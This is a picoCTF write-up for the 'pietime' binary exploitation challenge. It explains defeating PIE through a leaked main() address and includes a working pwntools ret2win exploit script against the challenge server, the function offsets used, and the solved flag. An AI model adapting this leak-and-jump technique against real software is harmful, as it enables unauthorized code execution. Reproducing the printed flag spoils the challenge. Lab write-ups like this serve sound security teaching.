pietime: PIE Bypass via Address Leak

picoctf PIE address-leak ret2win

Challenge Overview

pietime is a binary exploitation challenge from picoCTF that demonstrates a classic Position Independent Executable (PIE) bypass technique. The binary leaks its own base address through the main function, allowing us to defeat ASLR/PIE and calculate the location of a hidden win() function.

Binary Analysis

The challenge binary has the following characteristics:

  • PIE Enabled: Base address randomized at runtime
  • NX Enabled: Stack is non-executable
  • No Canary: Stack smashing protection disabled
  • Partial RELRO: GOT is writable
🔍 Key Vulnerability

The binary prints the address of main() before reading user input. This information leak allows us to calculate the PIE base address and locate any function in the binary, including the win() function that spawns a shell.

Exploitation Strategy

Step 1: Leak the Address

The binary leaks the address of main() in the format: "main is at: 0xADDRESS". We parse this leak using regex to extract the hexadecimal address.

Step 2: Calculate PIE Base

Once we have the leaked main() address, we subtract the offset of main from the binary base to get the PIE base address. From there, we can calculate the absolute address of any function using its offset from the base.

exploit.py 
from pwn import *
import re

p = remote("rescued-float.picoctf.net", 58034)

# Receive the line containing the address leak
line = p.recvline()

# Extract the hexadecimal address using regex
match = re.search(rb'0x[0-9a-fA-F]+', line)
if not match:
    log.failure("Address not found")
    exit()

# Convert leaked address from bytes to integer
main_addr = int(match.group(0), 16)
log.success(f"Main leak: {hex(main_addr)}")

# Calculate PIE base: leaked_main - main_offset
piebase = main_addr - 0x133d
offset_win = 0x12a7

# Calculate absolute address of win()
win = piebase + offset_win
log.success(f"Win address: {hex(win)}")

# Send the calculated win address to jump to it
p.sendlineafter(
    b'Enter the address to jump to, ex => 0x12345: ',
    hex(win).encode()
)

p.interactive()

Step 3: Offset Calculation

The offsets used in the exploit are determined through static analysis:

  • main_offset = 0x133d — Distance from PIE base to main()
  • win_offset = 0x12a7 — Distance from PIE base to win()
💡 Pro Tip

Use readelf -s binary or objdump -d binary to find function offsets when PIE is enabled. Look for the offset from the start of the .text section.

Why This Works

PIE randomizes the base address of the binary but maintains consistent relative offsets between functions. By leaking any function address, we obtain the slide value (randomization offset) and can compute the location of any other function in the binary.

Mitigation Bypass

This challenge demonstrates why information leaks are critical vulnerabilities. Even with full ASLR and PIE enabled, a single address leak completely defeats the randomization, reducing the exploit to a simple ret2win scenario.

Challenge Flag
picoCTF{p13_5h0u1d_b3_r4nd0m1z3d_6f2ce0c0}

Key Takeaways

  • Information leaks defeat ASLR/PIE mitigations
  • Relative offsets remain constant even with PIE enabled
  • Always audit programs for format string bugs or debug output that prints addresses
  • Regex is your friend when parsing output from remote services
